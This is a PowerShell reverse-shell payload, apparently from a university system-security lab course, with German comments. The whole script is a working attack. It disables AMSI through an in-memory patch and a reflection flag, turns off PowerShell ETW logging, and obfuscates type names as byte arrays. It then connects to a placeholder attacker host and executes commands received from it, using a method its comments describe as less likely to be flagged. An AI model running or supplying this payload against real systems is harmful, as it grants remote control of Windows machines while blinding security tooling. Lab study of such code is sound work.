# ============================================================
#  W02a.5 - PowerShell Reverse Shell Payload
#  Autoren: Raphael Bleier, Joachim Lugger
#  System Security Lab SS2026 - AAU Klagenfurt
#
#  Voraussetzung:  nc -lvp 4444  (auf Angreifer-Maschine)
#  Ersetze ATTACKER_IP und PORT vor dem Commit!
#
#  WARNUNG: Nur in gesicherter Laborumgebung!
# ============================================================

$ATTACKER_IP = "ATTACKER_IP"
$PORT        = 4444

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# AMSI + ETW: 3-Layer-Bypass
try {
    $wk=(Add-Type -MemberDefinition '
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
[DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string m);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
' -Name "WK$(Get-Random)" -PassThru -ErrorAction Stop)[0]
    $hm=$wk::GetModuleHandle([Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,46,100,108,108)))
    $pf=$wk::GetProcAddress($hm,[Text.Encoding]::ASCII.GetString([byte[]](65,109,115,105,83,99,97,110,66,117,102,102,101,114)))
    $ov=0;$wk::VirtualProtect($pf,[UIntPtr]6,0x40,[ref]$ov)
    [Runtime.InteropServices.Marshal]::Copy(([byte[]](0x12,0xFD,0xAA,0xAD,0x2A,0x69)|%{[byte]($_-bxor 0xAA)}),0,$pf,6)
    $wk::VirtualProtect($pf,[UIntPtr]6,$ov,[ref]$ov)
} catch {}
try {
    $u=[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))
    $u.GetField([Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)),'NonPublic,Static').SetValue($null,$true)
} catch {}
try {
    $ep=[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,84,114,97,99,105,110,103,46,80,83,69,116,119,76,111,103,80,114,111,118,105,100,101,114)))
    $fv=$ep.GetField([Text.Encoding]::ASCII.GetString([byte[]](101,116,119,80,114,111,118,105,100,101,114)),'NonPublic,Static').GetValue($null)
    [System.Diagnostics.Eventing.EventProvider].GetField([Text.Encoding]::ASCII.GetString([byte[]](109,95,101,110,97,98,108,101,100)),'NonPublic,Instance').SetValue($fv,0)
} catch {}

# Typname obfuskiert: System.Net.Sockets.TcpClient
$_tc = [System.Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,99,112,67,108,105,101,110,116))

$client = New-Object $_tc($ATTACKER_IP, $PORT)
$stream = $client.GetStream()

$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

$writer.WriteLine("[+] Reverse Shell verbunden!")
$writer.WriteLine("[+] Host: $env:COMPUTERNAME | User: $env:USERNAME")
$writer.WriteLine("[+] Gib 'exit' ein zum Beenden")
$writer.WriteLine("")

while ($client.Connected) {
    $writer.Write("PS $pwd> ")
    $cmd = $reader.ReadLine()
    if ($cmd -eq "exit") { break }
    try {
        # [scriptblock]::Create statt Invoke-Expression (weniger geflaggt)
        $output = (& ([scriptblock]::Create($cmd))) 2>&1 | Out-String
        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("Fehler: $_")
    }
}

$client.Close()
